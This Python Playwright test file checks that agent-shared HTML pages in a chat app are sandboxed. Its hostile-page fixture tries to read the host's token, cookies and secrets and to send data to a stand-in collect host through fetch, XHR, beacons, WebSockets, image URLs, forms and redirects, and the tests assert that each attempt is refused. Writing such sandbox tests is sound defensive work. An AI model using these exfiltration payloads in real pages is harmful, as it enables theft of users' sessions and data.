"""A page the agent shared, in a real browser: it runs, and it reaches
nothing but itself.

The page route and the security middleware are the app's own
(routers/agent_files.py, app/core/security.py), served here by a small
server of this test with a page around the frame that stands for the app:
it holds a sign-in in its storage, a cookie and a secret, and frames the
page as agent-workspace.js does. The page inside tries to read all of it and
to reach the network in every way a page has. What the file store hands the
route is this test's (tests/test_agent_pages.py covers the store's part).

An HTML block written in an answer runs in the fixed document of the same
path (html_page.written_document), which the app's page hands the code as a
message: the same page is as confined there, and the document shows nothing
that anyone but the page framing it sends.
"""
import json
import re
import socket
import threading

import pytest
from playwright.sync_api import expect

from app.core import html_page

CHAT, HOSTILE, FRIENDLY, SECOND = 'a' * 32, 'b' * 32, 'c' * 32, '2' * 32

FRIENDLY_PAGE = """<!doctype html><meta charset="utf-8"><title>Slider</title>
<style>body { font: 16px system-ui; margin: 24px } output { font-weight: 600 }</style>
<label for="n">Runs</label> <input id="n" type="range" min="0" max="10" value="3">
<output id="o">3 runs</output> <button id="b" type="button">Double</button>
<p><a id="leave" href="OTHER/collect?via=link-click">Source</a> <a id="jump" href="#end">To the end</a></p>
<p id="end">End</p>
<script>
  const n = document.getElementById('n'), o = document.getElementById('o');
  const show = () => { o.textContent = n.value + ' runs'; };
  n.addEventListener('input', show);
  document.getElementById('b').addEventListener('click', () => { n.value = String(Math.min(10, n.value * 2)); show(); });
</script>"""

# Every way out a page has. ORIGIN is the address the page itself came from,
# OTHER another host: a request to either would reach /collect.
HOSTILE_PAGE = """<!doctype html><meta charset="utf-8"><title>Hostile</title>
<link rel="stylesheet" href="OTHER/collect?via=stylesheet">
<link rel="preload" as="fetch" href="OTHER/collect?via=preload">
<link rel="prefetch" href="OTHER/collect?via=prefetch">
<style>@import url("OTHER/collect?via=css-import"); body { background: url("OTHER/collect?via=css-url") }
@font-face { font-family: x; src: url("OTHER/collect?via=font") } body { font-family: x }</style>
<pre id="out">running</pre>
<img src="OTHER/collect?via=img"><img src="ORIGIN/collect?via=img-origin">
<video src="OTHER/collect?via=video"></video><object data="OTHER/collect?via=object"></object>
<iframe src="OTHER/collect?via=frame"></iframe><iframe src="ORIGIN/collect?via=frame-origin"></iframe>
<script src="OTHER/collect?via=script"></script><script src="ORIGIN/collect?via=script-origin"></script>
<form id="f" action="OTHER/collect?via=form" method="post" target="_top"><input name="a" value="1"></form>
<a id="a" href="OTHER/collect?via=link" ping="OTHER/collect?via=ping">leave</a>
<script>
(async () => {
  const out = { origin: self.origin, ran: true };
  const attempt = async (name, run) => {
    try { out[name] = await run(); } catch (error) { out[name] = 'refused: ' + (error && error.name || error); }
  };
  const within = (promise, ms = 600) => Promise.race([promise,
    new Promise((resolve, reject) => setTimeout(() => reject(new Error('nothing')), ms))]);
  await attempt('parentDocument', () => parent.document.title);
  await attempt('topDocument', () => top.document.title);
  await attempt('topSecret', () => top.secret);
  await attempt('topLocation', () => top.location.href);
  await attempt('topStorage', () => top.localStorage.getItem('idToken'));
  await attempt('localStorage', () => localStorage.getItem('idToken'));
  await attempt('sessionStorage', () => sessionStorage.length);
  await attempt('cookie', () => document.cookie);
  await attempt('setCookie', () => { document.cookie = 'planted=1; path=/'; return 'set'; });
  await attempt('indexedDB', () => within(new Promise((resolve, reject) => {
    const request = indexedDB.open('probe'); request.onsuccess = () => resolve('opened'); request.onerror = () => reject(request.error);
  })));
  await attempt('caches', () => within(caches.open('probe').then(() => 'opened')));
  await attempt('serviceWorker', () => within(navigator.serviceWorker.register('ORIGIN/collect?via=service-worker').then(() => 'registered')));
  await attempt('fetchOrigin', () => within(fetch('ORIGIN/collect?via=fetch-origin', { credentials: 'include' }).then(r => 'status ' + r.status)));
  await attempt('fetchAddress', () => within(fetch('ORIGIN/agent/chats/CHAT/files', { credentials: 'include' }).then(r => 'status ' + r.status)));
  await attempt('fetchOther', () => within(fetch('OTHER/collect?via=fetch').then(r => 'status ' + r.status)));
  await attempt('fetchNoCors', () => within(fetch('OTHER/collect?via=fetch-no-cors', { mode: 'no-cors' }).then(() => 'sent')));
  await attempt('xhr', () => within(new Promise((resolve, reject) => {
    const request = new XMLHttpRequest(); request.open('POST', 'OTHER/collect?via=xhr');
    request.onload = () => resolve('status ' + request.status); request.onerror = () => reject(new Error('NetworkError')); request.send('x');
  })));
  await attempt('beacon', () => navigator.sendBeacon('OTHER/collect?via=beacon', 'x') ? 'queued' : 'refused: beacon');
  await attempt('webSocket', () => within(new Promise((resolve, reject) => {
    const socket = new WebSocket('WS/collect-ws'); socket.onopen = () => resolve('open'); socket.onerror = () => reject(new Error('SocketError'));
  })));
  await attempt('eventSource', () => within(new Promise((resolve, reject) => {
    const source = new EventSource('OTHER/collect?via=event-source'); source.onopen = () => resolve('open'); source.onerror = () => reject(new Error('SourceError'));
  })));
  await attempt('image', () => within(new Promise((resolve, reject) => {
    const image = new Image(); image.onload = () => resolve('loaded'); image.onerror = () => reject(new Error('ImageError'));
    image.src = 'OTHER/collect?via=image&secret=' + encodeURIComponent(document.title);
  })));
  await attempt('scriptElement', () => within(new Promise((resolve, reject) => {
    const script = document.createElement('script'); script.onload = () => resolve('loaded'); script.onerror = () => reject(new Error('ScriptError'));
    script.src = 'OTHER/collect?via=script-element'; document.head.append(script);
  })));
  await attempt('moduleImport', () => within(import('OTHER/collect?via=import').then(() => 'imported')));
  await attempt('worker', () => within(new Promise((resolve, reject) => {
    const worker = new Worker('ORIGIN/collect?via=worker'); worker.onmessage = () => resolve('ran'); worker.onerror = () => reject(new Error('WorkerError'));
  })));
  await attempt('popup', () => window.open('OTHER/collect?via=popup') ? 'opened' : 'refused: popup');
  await attempt('topNavigation', () => { top.location = 'OTHER/collect?via=top-navigation'; return 'assigned'; });
  await attempt('parentNavigation', () => { parent.location = 'OTHER/collect?via=parent-navigation'; return 'assigned'; });
  await attempt('form', () => { document.getElementById('f').submit(); return 'submitted'; });
  await attempt('link', () => { document.getElementById('a').click(); return 'clicked'; });
  await attempt('download', () => {
    const link = document.createElement('a'); link.href = 'data:text/plain,stolen'; link.download = 'stolen.txt';
    document.body.append(link); link.click(); return 'clicked';
  });
  await attempt('dialog', () => { alert('Session expired. Sign in again.'); return 'returned'; });
  await attempt('tellTop', () => { top.postMessage('hello from the page', '*'); return 'posted'; });
  out.done = true;
  document.getElementById('out').textContent = JSON.stringify(out);
})();
</script>"""

# A page that goes elsewhere itself, each in its way.
LEAVING = {
    'd' * 32: '<p id="here">here</p><script>setTimeout(() => { location.href = "OTHER/collect?via=location"; }, 200);</script>',
    'e' * 32: '<meta http-equiv="refresh" content="0;url=OTHER/collect?via=meta-refresh"><p id="here">here</p>',
    'f' * 32: '<p id="here">here</p><script>setTimeout(() => { location.replace("ORIGIN/collect?via=replace"); }, 200);</script>',
    '1' * 32: ('<p id="here">here</p><a id="a" href="ORIGIN/collect?via=scripted-click">x</a>'
               '<script>setTimeout(() => { const event = new MouseEvent("click", { bubbles: true, cancelable: true });'
               ' document.getElementById("a").dispatchEvent(event); location.assign("OTHER/collect?via=assign"); }, 200);</script>'),
}

HOST_PAGE = """<!doctype html><meta charset="utf-8"><title>The app</title>
<script>
  localStorage.setItem('idToken', 'SECRET-TOKEN');
  document.cookie = 'session=SECRET-COOKIE; path=/';
  window.secret = 'SECRET-VALUE';
  window.heard = [];
  addEventListener('message', event => heard.push([event.origin, typeof event.data === 'string' ? event.data : JSON.stringify(event.data)]));
</script>
<iframe id="page" sandbox="allow-scripts" referrerpolicy="no-referrer" title="page" style="width:800px;height:500px"></iframe>
<script>
  fetch('/collect?via=control');
  fetch('/agent/chats/CHAT/files/FILE/page', { method: 'POST' }).then(response => response.json())
    .then(body => { document.getElementById('page').src = body.url; });
</script>"""

# The app's page around a page written in an answer (attachments.js
# showWrittenPage): it frames the fixed document and hands it the code.
WRITTEN_HOST_PAGE = """<!doctype html><meta charset="utf-8"><title>The app</title>
<script>
  localStorage.setItem('idToken', 'SECRET-TOKEN');
  document.cookie = 'session=SECRET-COOKIE; path=/';
  window.secret = 'SECRET-VALUE';
  window.heard = [];
  addEventListener('message', event => heard.push([event.origin, typeof event.data === 'string' ? event.data : JSON.stringify(event.data)]));
</script>
<iframe id="page" sandbox="allow-scripts" referrerpolicy="no-referrer" title="page" style="width:800px;height:500px"></iframe>
<script>
  fetch('/collect?via=control');
  const frame = document.getElementById('page');
  frame.addEventListener('load', () => frame.contentWindow.postMessage({ consensPage: { source: SOURCE } }, '*'));
  frame.src = 'WRITTEN';
</script>"""
# A page that tries to put another one in its place.
SECOND_PAGE = """<p id="first">first</p>
<script>
  const other = { consensPage: { source: '<p id="second">second</p>' } };
  parent.postMessage(other, '*'); top.postMessage(other, '*'); postMessage(other, '*');
</script>"""


@pytest.fixture(scope='module')
def page_server():
    import uvicorn
    from fastapi import FastAPI, Request, WebSocket
    from fastapi.responses import HTMLResponse, Response

    from app.api.routers import agent_files as router
    from app.core.rate_limit import limiter
    from app.core.security import CustomSecurityMiddleware

    hits, pages = [], {}

    class Files:
        def __init__(self, db):
            pass

        def get(self, uid, chat_id, file_id):
            if uid != 'owner' or chat_id != CHAT or file_id not in pages:
                raise router.FileUnavailable('File is unavailable or still processing.')
            return {'name': file_id + '.html', 'page': 'html', 'mime': 'text/html'}

        def download(self, uid, chat_id, file_id, data=None):
            return self.get(uid, chat_id, file_id), pages[file_id]

    patch = pytest.MonkeyPatch()
    patch.setattr(router, 'AgentFiles', Files)
    patch.setattr(router, '_chat_uid', lambda request: 'owner')
    patch.setattr(router, 'require_agent_access', lambda uid: None)
    patch.setattr(limiter, 'enabled', False)

    app = FastAPI()
    app.include_router(router.router)
    app.add_middleware(CustomSecurityMiddleware)

    @app.get('/host/{file_id}', response_class=HTMLResponse)
    def host(file_id: str):
        return HOST_PAGE.replace('CHAT', CHAT).replace('FILE', file_id)

    @app.get('/host-written/{file_id}', response_class=HTMLResponse)
    def host_written(file_id: str):
        # As a string of the script: no "<" of the page may end that script.
        source = json.dumps(pages[file_id].decode()).replace('<', '\\u003c')
        return WRITTEN_HOST_PAGE.replace('SOURCE', source).replace('WRITTEN', html_page.WRITTEN_PATH)

    @app.api_route('/collect', methods=['GET', 'POST', 'PUT', 'OPTIONS'])
    def collect(request: Request, via: str = ''):
        hits.append({'via': via, 'method': request.method, 'cookie': request.headers.get('cookie', '')})
        return Response('ok', media_type='text/plain', headers={'Access-Control-Allow-Origin': '*'})

    @app.websocket('/collect-ws')
    async def collect_ws(websocket: WebSocket):
        hits.append({'via': 'websocket', 'method': 'WS', 'cookie': websocket.headers.get('cookie', '')})
        await websocket.accept()
        await websocket.close()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(('127.0.0.1', 0))
    port = listener.getsockname()[1]
    server = uvicorn.Server(uvicorn.Config(app, log_level='warning', lifespan='off'))
    thread = threading.Thread(target=server.run, kwargs={'sockets': [listener]}, daemon=True)
    thread.start()
    try:
        deadline = threading.Event()
        for _ in range(200):
            if server.started:
                break
            deadline.wait(0.05)
        assert server.started, 'The page server did not start'
        origin, other = f'http://127.0.0.1:{port}', f'http://localhost:{port}'
        pages[FRIENDLY] = FRIENDLY_PAGE.replace('OTHER', other).encode()
        pages[SECOND] = SECOND_PAGE.encode()
        for file_id, markup in LEAVING.items():
            pages[file_id] = markup.replace('OTHER', other).replace('ORIGIN', origin).encode()
        pages[HOSTILE] = (HOSTILE_PAGE.replace('OTHER', other).replace('ORIGIN', origin).replace('CHAT', CHAT)
                          .replace('WS', f'ws://127.0.0.1:{port}')).encode()
        yield {'origin': origin, 'other': other, 'hits': hits}
    finally:
        server.should_exit = True
        thread.join(15)
        listener.close()
        patch.undo()


def _framed(page):
    """The address the app's page gives its frame, once its request answered.

    Not page.wait_for_function with a string: Playwright evaluates that again
    on every poll, and this page's CSP refuses the eval once the first check
    finds no address yet."""
    frame = page.locator('#page')
    expect(frame).to_have_attribute('src', re.compile(r'.'), timeout=30_000)
    return frame.get_attribute('src')


def _report(frame):
    out = frame.locator('#out')
    expect(out).to_contain_text('"done":true', timeout=40_000)
    return json.loads(out.text_content())


# What the page may not read, and what it may not send: every one refused.
REACH = ('parentDocument', 'topDocument', 'topSecret', 'topLocation', 'topStorage', 'localStorage', 'sessionStorage',
         'cookie', 'setCookie', 'indexedDB', 'caches', 'serviceWorker')
SEND = ('fetchOrigin', 'fetchAddress', 'fetchOther', 'fetchNoCors', 'xhr', 'webSocket', 'eventSource', 'image',
        'scriptElement', 'moduleImport', 'worker', 'popup', 'topNavigation', 'parentNavigation')


def _confined(report):
    assert report['ran'] is True and report['origin'] == 'null', report
    for name in (*REACH, *SEND):
        assert str(report[name]).startswith('refused'), (name, report[name])
    # Nothing the page learned names the app's secrets.
    assert 'SECRET' not in json.dumps(report)


def test_a_page_in_the_chat_runs_and_reaches_nothing_of_the_app_or_the_network(browser, page_server):
    context = browser.new_context(viewport={'width': 1100, 'height': 800})
    page = context.new_page()
    dialogs, downloads, answered = [], [], []
    page.on('dialog', lambda dialog: (dialogs.append(dialog.message), dialog.dismiss()))
    page.on('download', lambda download: downloads.append(download.suggested_filename))
    # What a server answered: the browser names a request it refused itself as well.
    context.on('response', lambda response: answered.append(response.url))
    try:
        page.goto(f"{page_server['origin']}/host/{HOSTILE}")
        _framed(page)
        frame = page.frame_locator('#page').frame_locator('iframe')
        report = _report(frame)
        _confined(report)
        # The page said hello to the window around it, and how tall it is
        # (html_page._FIT): messages, from no origin, that carry nothing else.
        heard = page.evaluate('heard')
        assert ['null', 'hello from the page'] in heard and {origin for origin, _ in heard} == {'null'}
        heights = [json.loads(said) for _, said in heard if said != 'hello from the page']
        assert heights and all(list(said) == ['consensPage'] and list(said['consensPage']) == ['height']
                               and said['consensPage']['height'] > 0 for said in heights), heard
        # Its own script ran, its attempts to leave did not: the page still
        # stands there, the app's page is where it was, and nothing opened,
        # asked or saved.
        page.wait_for_timeout(800)
        expect(frame.locator('#out')).to_contain_text('"done":true')
        assert page.url == f"{page_server['origin']}/host/{HOSTILE}"
        assert page.evaluate("[window.secret, localStorage.getItem('idToken'), document.cookie]") == [
            'SECRET-VALUE', 'SECRET-TOKEN', 'session=SECRET-COOKIE']
        assert len(context.pages) == 1 and dialogs == [] and downloads == []
        # The network saw the app's own requests and the page's document, nothing of the page's.
        assert [hit['via'] for hit in page_server['hits']] == ['control'], page_server['hits']
        left = [url for url in answered if '/collect' in url and 'via=control' not in url]
        assert left == [], left
    finally:
        page_server['hits'].clear()
        context.close()


def test_the_page_is_as_confined_when_its_address_is_opened_by_itself(browser, page_server):
    """The sandbox is the answer's, not the frame's: whoever opens the
    address in a tab gets the same page that reaches nothing."""
    context = browser.new_context(viewport={'width': 1100, 'height': 800})
    page = context.new_page()
    try:
        page.goto(f"{page_server['origin']}/host/{HOSTILE}")
        address = _framed(page)
        page_server['hits'].clear()
        alone = context.new_page()
        response = alone.goto(page_server['origin'] + address)
        assert response.status == 200 and response.headers['content-security-policy'].startswith('sandbox allow-scripts;')
        report = _report(alone.frame_locator('iframe'))
        _confined(report)
        alone.wait_for_timeout(800)
        assert alone.url == page_server['origin'] + address
        assert page_server['hits'] == [], page_server['hits']
        # The document around the file is the app's and runs nothing itself.
        assert alone.evaluate("[document.scripts.length, document.querySelectorAll('iframe').length]") == [0, 1]
    finally:
        page_server['hits'].clear()
        context.close()


def test_a_page_does_what_it_was_built_for_and_the_keyboard_gets_in_and_out(browser, page_server):
    context = browser.new_context(viewport={'width': 1100, 'height': 800})
    page = context.new_page()
    errors = []
    page.on('pageerror', lambda error: errors.append(str(error)))
    try:
        page.goto(f"{page_server['origin']}/host/{FRIENDLY}")
        page.evaluate("""() => {
          for (const label of ['before', 'after']) {
            const button = document.createElement('button'); button.id = label; button.textContent = label;
            document.getElementById('page')[label](button);
          }
        }""")
        frame = page.frame_locator('#page').frame_locator('iframe')
        expect(frame.locator('#o')).to_have_text('3 runs')
        # A click and the keys work the page's own controls.
        frame.locator('#b').click()
        expect(frame.locator('#o')).to_have_text('6 runs')
        frame.locator('#n').focus()
        page.keyboard.press('ArrowRight')
        page.keyboard.press('ArrowRight')
        expect(frame.locator('#o')).to_have_text('8 runs')
        # Tab goes on through the page and leaves it for what follows it;
        # Shift+Tab goes back into it and out at its beginning.
        for _ in range(4):
            page.keyboard.press('Tab')
        assert page.evaluate('document.activeElement.id') == 'after'
        page.keyboard.press('Shift+Tab')
        assert page.evaluate('document.activeElement.id') == 'page'
        for _ in range(4):
            page.keyboard.press('Shift+Tab')
        assert page.evaluate('document.activeElement.id') == 'before'
        # A link within the page works; one to another address does nothing,
        # and the page stays where it is.
        frame.locator('#jump').click()
        assert frame.locator('body').evaluate("() => [location.hash, document.querySelector(':target')?.id]") == ['#end', 'end']
        frame.locator('#leave').click()
        page.wait_for_timeout(600)
        expect(frame.locator('#o')).to_have_text('8 runs')
        assert page_server['hits'] == [{'via': 'control', 'method': 'GET', 'cookie': 'session=SECRET-COOKIE'}]
        assert not errors, errors
    finally:
        page_server['hits'].clear()
        context.close()


@pytest.mark.parametrize('file_id', sorted(LEAVING))
def test_a_page_that_goes_elsewhere_reaches_no_other_address(browser, page_server, file_id):
    """A framed page can send itself away; where it may go is the page
    around it, and the document around the file allows no address at all.
    Nothing is asked of any server, and the app's page stays where it is."""
    context = browser.new_context(viewport={'width': 1100, 'height': 800})
    page = context.new_page()
    answered = []
    context.on('response', lambda response: answered.append(response.url))
    try:
        page.goto(f"{page_server['origin']}/host/{file_id}")
        _framed(page)
        # Long enough for the page's own timer and the browser's refusal.
        page.wait_for_timeout(1500)
        assert [hit['via'] for hit in page_server['hits']] == ['control'], page_server['hits']
        assert [url for url in answered if '/collect' in url and 'via=control' not in url] == []
        assert page.url == f"{page_server['origin']}/host/{file_id}" and len(context.pages) == 1
        # Whatever the frame shows now, it is nothing from another address.
        for frame in page.frames:
            assert '/collect' not in frame.url, frame.url
    finally:
        page_server['hits'].clear()
        context.close()


def test_a_page_written_in_an_answer_runs_as_confined_as_a_shared_one(browser, page_server):
    """The code never came from the server: the app's page gave it to the
    fixed document, and there it reaches nothing of the app or the network."""
    context = browser.new_context(viewport={'width': 1100, 'height': 800})
    page = context.new_page()
    dialogs, downloads, answered = [], [], []
    page.on('dialog', lambda dialog: (dialogs.append(dialog.message), dialog.dismiss()))
    page.on('download', lambda download: downloads.append(download.suggested_filename))
    context.on('response', lambda response: answered.append(response.url))
    try:
        page.goto(f"{page_server['origin']}/host-written/{HOSTILE}")
        inner = page.frame_locator('#page').frame_locator('iframe')
        _confined(_report(inner))
        # What the app's page heard of it: its hello, from no origin.
        assert page.evaluate('heard') == [['null', 'hello from the page']]
        page.wait_for_timeout(800)
        expect(inner.locator('#out')).to_contain_text('"done":true')
        assert page.url == f"{page_server['origin']}/host-written/{HOSTILE}"
        assert page.evaluate("[window.secret, localStorage.getItem('idToken'), document.cookie]") == [
            'SECRET-VALUE', 'SECRET-TOKEN', 'session=SECRET-COOKIE']
        assert len(context.pages) == 1 and dialogs == [] and downloads == []
        assert [hit['via'] for hit in page_server['hits']] == ['control'], page_server['hits']
        left = [url for url in answered if '/collect' in url and 'via=control' not in url]
        assert left == [], left
        # The document that took the code is sandboxed by its own answer.
        response = context.request.get(page_server['origin'] + html_page.WRITTEN_PATH)
        assert response.status == 200 and response.headers['content-security-policy'] == html_page.POLICY
    finally:
        page_server['hits'].clear()
        context.close()


def test_the_document_of_a_written_page_shows_only_what_the_page_framing_it_sends(browser, page_server):
    """Once it shows a page, no later message changes it, the page's own
    included. Opened by itself it stays empty, whoever opened it and whatever
    that window sends: no markup of a stranger stands under this address."""
    context = browser.new_context(viewport={'width': 1100, 'height': 800})
    page = context.new_page()
    try:
        page.goto(f"{page_server['origin']}/host-written/{SECOND}")
        written = page.frame_locator('#page')
        expect(written.frame_locator('iframe').locator('#first')).to_have_text('first')
        page.evaluate("""() => document.getElementById('page').contentWindow.postMessage(
          { consensPage: { source: '<p id="third">third</p>' } }, '*')""")
        page.wait_for_timeout(400)
        expect(written.locator('iframe')).to_have_count(1)
        expect(written.frame_locator('iframe').locator('#first')).to_have_text('first')
        expect(written.frame_locator('iframe').locator('#second, #third')).to_have_count(0)
        # A window of another site opens the address and sends it a page.
        opener = context.new_page()
        opener.goto(f"{page_server['other']}/collect?via=opener")
        with context.expect_page() as opened:
            opener.evaluate("""address => {
              const other = window.open(address);
              let sent = 0;
              const send = () => {
                other.postMessage({ consensPage: { source: '<p id="planted">planted</p>' } }, '*');
                if (++sent < 30) setTimeout(send, 50);
              };
              send();
            }""", page_server['origin'] + html_page.WRITTEN_PATH)
        alone = opened.value
        alone.wait_for_load_state()
        alone.wait_for_timeout(1600)
        assert alone.url == page_server['origin'] + html_page.WRITTEN_PATH
        assert alone.evaluate("[document.querySelectorAll('iframe').length, document.body.innerText.trim()]") == [0, '']
    finally:
        page_server['hits'].clear()
        context.close()
